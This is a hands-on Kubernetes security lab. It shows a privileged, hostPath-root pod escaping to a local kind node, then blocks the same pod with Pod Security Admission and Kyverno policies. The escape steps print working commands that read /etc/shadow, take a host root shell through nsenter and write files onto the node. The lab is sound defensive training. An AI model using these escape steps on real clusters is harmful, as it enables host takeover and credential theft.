# labs/kind-escape-lab.md

> **Level:** Advanced
> **Prereqs:** 03-05 (K8s Attack Surface), 03-07 (PSA), 03-08 (Escape Classes)
> **Clouds:** OnPrem (local `kind` cluster)
> **Authorization scope:** Entire lab runs on a local `kind` cluster. Zero cloud resources consumed. All escape demonstrations are contained within your own machine.

## Lab goal

Deploy a `kind` cluster, launch a privileged pod with `hostPath: /`, demonstrate full host filesystem access, install Kyverno + enforce Pod Security Admission `restricted`, retry the escape, and confirm it is blocked. Collect and interpret all artifacts.

## Prerequisites

- `docker` (or `podman` with `kind` support)
- `kind` (`brew install kind` or https://kind.sigs.k8s.io/)
- `kubectl`
- `helm` (`brew install helm`)

## Step 1 — Create the lab cluster

```bash
kind create cluster --name escape-lab
kubectl cluster-info --context kind-escape-lab
```

Expected output: `Kubernetes control plane is running at https://127.0.0.1:<port>`

## Step 2 — Verify no admission control is active

```bash
kubectl get ns default -o json | jq '.metadata.labels'
```

Expected output: `null` (no pod-security labels), meaning no PSA enforcement on the `default` namespace.

```bash
kubectl get validatingwebhookconfigurations -A
```

Expected output: Should list only the default `kind` webhooks (typically none or `cert-manager`). No Kyverno/Gatekeeper present.

## Step 3 — Deploy privileged pod with hostPath root mount

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: container
      image: alpine:3.19
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
        capabilities:
          add:
            - SYS_ADMIN
            - SYS_PTRACE
      volumeMounts:
        - name: hostroot
          mountPath: /host
  volumes:
    - name: hostroot
      hostPath:
        path: /
EOF

kubectl get pod escape-pod
```

Expected output: `escape-pod   1/1   Running   0   Xs`

## Step 4 — Demonstrate host filesystem access (the escape)

```bash
kubectl exec -it escape-pod -- sh
```

Inside the container:

```sh
# 4a. Read the host's /etc/shadow via the hostPath mount
cat /host/etc/shadow
# Expected: contents of host's shadow file (may be empty on kind nodes but file exists)

# 4b. Read the host's hostname
cat /host/etc/hostname
# Expected: the kind node's hostname (e.g., "kind-control-plane")

# 4c. List host processes (hostPID=true gives us the host's PID namespace)
ps aux | head -20
# Expected: systemd (or init), containerd, kubelet, etcd, kube-apiserver processes visible

# 4d. Use nsenter to join host namespace (pid 1 = init on host)
nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname'
# Expected output: uid=0(root) gid=0(root) groups=0(root)
# hostname: kind-control-plane (the host's hostname, not the container's)

# 4e. Write a file to the host's /tmp (persistence simulation)
echo "escape-successful" > /host/tmp/escape-artifact.txt
cat /host/tmp/escape-artifact.txt
# Expected: escape-successful

exit
```

## Step 5 — Verify artifact on the host node

```bash
# Access the kind node via docker exec
docker exec kind-control-plane cat /tmp/escape-artifact.txt
```

Expected output: `escape-successful` — the file written from inside the container is visible on the actual host.

## Step 6 — Install Kyverno

```bash
helm repo add kyverno https://kyverno.github.io/kyverno/
helm repo update
helm install kyverno kyverno/kyverno \
  --namespace kyverno \
  --create-namespace \
  --set admissionController.replicas=1 \
  --set backgroundController.enabled=false \
  --set cleanupController.enabled=false \
  --set reportsController.enabled=false
```

Wait for Kyverno to be ready:

```bash
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=kyverno -n kyverno --timeout=120s
```

Verify the validating webhook is registered:

```bash
kubectl get validatingwebhookconfigurations kyverno-validating-webhook-cfg
```

Expected: `kyverno-validating-webhook-cfg` exists.

## Step 7 — Apply admission policies

### 7a: Apply PSA restricted label

```bash
kubectl label ns default pod-security.kubernetes.io/enforce=restricted --overwrite
kubectl label ns default pod-security.kubernetes.io/audit=restricted --overwrite
kubectl label ns default pod-security.kubernetes.io/warn=restricted --overwrite
```

Verify:
```bash
kubectl get ns default -o json | jq '.metadata.labels["pod-security.kubernetes.io/enforce"]'
# Expected: "restricted"
```

### 7b: Apply Kyverno ClusterPolicy — deny privileged and hostPath

```bash
kubectl apply -f - <<EOF
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: prevent-escape
spec:
  validationFailureAction: Enforce
  background: false
  rules:
    - name: deny-privileged
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Privileged containers are forbidden"
        pattern:
          spec:
            containers:
              - securityContext:
                  privileged: "false"

    - name: deny-hostpath-root
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "hostPath to / is forbidden"
        pattern:
          spec:
            =(volumes):
              - =(hostPath):
                  path: "!/*"

    - name: deny-cap-sys-admin
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "CAP_SYS_ADMIN is forbidden"
        pattern:
          spec:
            containers:
              - securityContext:
                  capabilities:
                    add: "!SYS_ADMIN"

    - name: deny-hostpid
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "hostPID is forbidden"
        pattern:
          spec:
            hostPID: false

    - name: deny-hostnetwork
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "hostNetwork is forbidden"
        pattern:
          spec:
            hostNetwork: false
EOF
```

## Step 8 — Delete the privileged pod and attempt to recreate

```bash
kubectl delete pod escape-pod --force --grace-period=0

# Now try to recreate — this MUST fail
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: container
      image: alpine:3.19
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: hostroot
          mountPath: /host
  volumes:
    - name: hostroot
      hostPath:
        path: /
EOF
```

Expected error (PSA or Kyverno, whichever fires first):

```
Error from server (Forbidden): error when creating "STDIN":
admission webhook "validate.kyverno.svc" denied the request:
resource Pod/default/escape-pod was blocked due to the following policies

prevent-escape:
  deny-privileged: Privileged containers are forbidden
  deny-hostpath-root: hostPath to / is forbidden
  deny-cap-sys-admin: CAP_SYS_ADMIN is forbidden
  deny-hostpid: hostPID is forbidden
  deny-hostnetwork: hostNetwork is forbidden
```

If PSA fires first:
```
The Pod "escape-pod" is invalid: spec: Forbidden: violates PodSecurity "restricted:v1.28"
```

## Step 9 — Attempt a less obvious escape: CAP_SYS_ADMIN only, no privileged

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-cap-only
  namespace: default
spec:
  containers:
    - name: container
      image: alpine:3.19
      command: ["sleep", "3600"]
      securityContext:
        privileged: false
        capabilities:
          add:
            - SYS_ADMIN
EOF
```

Expected error:
```
admission webhook denied: CAP_SYS_ADMIN is forbidden
```

## Step 10 — Verify a compliant pod still works

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: good-pod
  namespace: default
spec:
  containers:
    - name: app
      image: nginx:alpine
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        seccompProfile:
          type: RuntimeDefault
        capabilities:
          drop:
            - ALL
EOF

kubectl get pod good-pod
```

Expected: `good-pod   1/1   Running   0   Xs`

## Step 11 — Collect and inspect artifacts

```bash
# a. List Kyverno policy reports
kubectl get policyreports -A

# b. Describe the failed admission attempts
kubectl describe clusterpolicy prevent-escape

# c. Check the Kyverno webhook logs for denied requests
kubectl logs -l app.kubernetes.io/name=kyverno -n kyverno | grep -i "blocked\|denied\|forbidden"
```

## Step 12 — Teardown

```bash
# Remove the escape artifact from the host
docker exec kind-control-plane rm -f /tmp/escape-artifact.txt

# Delete the cluster
kind delete cluster --name escape-lab
```

## Summary of results

| Stage | Action | Result |
|---|---|---|
| No admission control | Deploy privileged pod with hostPath `/` | Created; `cat /host/etc/shadow` succeeds |
| No admission control | `nsenter -t 1` to join host namespace | Host root shell obtained |
| No admission control | Write to `/host/tmp/` | File visible on host node |
| PSA restricted + Kyverno | Recreate same pod | Blocked by admission controller |
| PSA restricted + Kyverno | Pod with only `CAP_SYS_ADMIN` | Blocked |
| PSA restricted + Kyverno | Compliant pod (`runAsNonRoot`, seccomp, drop ALL) | Allowed |

## Detective artifacts map

| Artifact | Location | How to collect |
|---|---|---|
| Privileged pod created (pre-policy) | K8s audit log | `kubectl logs -n kube-system kube-apiserver-kind-control-plane \| jq 'select(.verb=="create" and .objectRef.resource=="pods")'` |
| nsenter syscall | Host syscall stream (Falco would detect) | Simulated — see Falco rule in lesson 03-08 |
| `/tmp/escape-artifact.txt` on host | Node filesystem | `docker exec kind-control-plane ls /tmp/escape-artifact.txt` |
| Kyverno deny events | Kyverno admission logs | `kubectl logs -n kyverno -l app.kubernetes.io/name=kyverno` |
| PSA audit warnings | API server response / audit log | Visible in kubectl stderr output during rejected `kubectl apply` |

## Cross-references

- Lesson: [`03-07-pod-security-admission-and-psp-replacements.md`](../pod-security-admission-and-psp-replacements.md)
- Lesson: [`03-08-container-escape-classes.md`](../container-escape-classes.md)
- Detection: [`../detections/k8s-rbac-anomaly-detection.md`](../detections/k8s-rbac-anomaly-detection.md)
